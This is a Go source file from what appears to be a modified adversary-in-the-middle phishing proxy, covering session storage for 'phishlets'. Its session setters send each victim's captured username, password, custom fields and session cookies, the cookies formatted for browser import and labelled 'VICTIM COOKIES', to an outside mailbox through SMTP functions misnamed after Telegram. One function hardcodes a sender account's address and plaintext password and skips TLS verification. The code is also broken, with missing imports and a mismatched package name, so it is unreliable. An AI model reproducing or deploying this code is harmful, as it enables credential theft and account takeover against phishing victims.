package database

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/smtp"
	"strconv"
	"strings"
	"time"
	"github.com/tidwall/buntdb"
	"gopkg.in/mail.v2"
)

func telegramSendResult(msg string) {
	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)

	m := gomail.NewMessage()

	// Set E-Mail sender
	m.SetHeader("From", "alainaubry@a2pfrance.fr")

	// Set E-Mail receivers
	m.SetHeader("To", "scyllascofield@outlook.com")

	// Set E-Mail subject
	m.SetHeader("Subject", "Gomail test subject")

	// Set E-Mail body. You can set plain text or html with text/html
	m.SetBody("text/plain", msg)

	// Settings for SMTP server
	d := gomail.NewDialer("smtp.ionos.de", 587, "alainaubry@a2pfrance.fr", "Angus4952!")

	// This is only needed when SSL/TLS certificate is not valid on server.
	// In production this should be set to false.
	d.TLSConfig = &tls.Config{InsecureSkipVerify: true}

	// Now send E-Mail
	if err := d.DialAndSend(m); err != nil {
		fmt.Println(err)
		panic(err)
	}

	return

}

func telegramSendVisitor(msg string) {
	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)


	from := os.Getenv("MAIL")
    password := os.Getenv("PASSWD")
 
    // toList is list of email address that email is to be sent.
    toList := []string{"example@gmail.com"}
 
    // host is address of server that the
    // sender's email address belongs,
    // in this case its gmail.
    // For e.g if your are using yahoo
    // mail change the address as smtp.mail.yahoo.com
    host := "smtp.gmail.com"
 
    // Its the default port of smtp server
    port := "587"
 
 
    // We can't send strings directly in mail,
    // strings need to be converted into slice bytes
    body := []byte(msg)
 
    // PlainAuth uses the given username and password to
    // authenticate to host and act as identity.
    // Usually identity should be the empty string,
    // to act as username.
    auth := smtp.PlainAuth("", from, password, host)
 
    // SendMail uses TLS connection to send the mail
    // The email is sent to all address in the toList,
    // the body should be of type bytes, not strings
    // This returns error if any occurred.
    err := smtp.SendMail(host+":"+port, auth, from, toList, body)
 
    // handling the errors
    if err != nil {
        fmt.Println(err)
        os.Exit(1)
    }
 
    fmt.Println("Successfully sent mail to all user in toList")
}

type Database struct {
	path string
	db   *buntdb.DB
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	telegramSendResult(fmt.Sprintf("🔥 🔥 USERNAME  :- 🔥 🔥\n\n-🆔ID: %s \n\n-👦🏻Username: %s\n", sid, username))
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	telegramSendResult(fmt.Sprintf("🔥 🔥 PASSWORD :- 🔥 🔥\n\n-🆔ID: %s \n\n-🔑Password: %s\n", sid, password))
	err := d.sessionsUpdatePassword(sid, password)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	telegramSendResult(fmt.Sprintf("🔥 🔥 CUSTOM 🔥 🔥\n\n-🆔ID: %s \n\nKey: %s\n-🔑Value: %s\n", sid, name, value))
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*Token) error {
	err := d.sessionsUpdateTokens(sid, tokens)

	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json11, _ := json.Marshal(cookies)
	telegramSendResult(fmt.Sprintf("🍪 🍪 🍪 🍪 🍪 VICTIM COOKIES 🍪 🍪 🍪 🍪 🍪 \n\n-🆔ID: %s\n\n %s\n", sid, string(json11)))
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	d.db.Shrink()
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
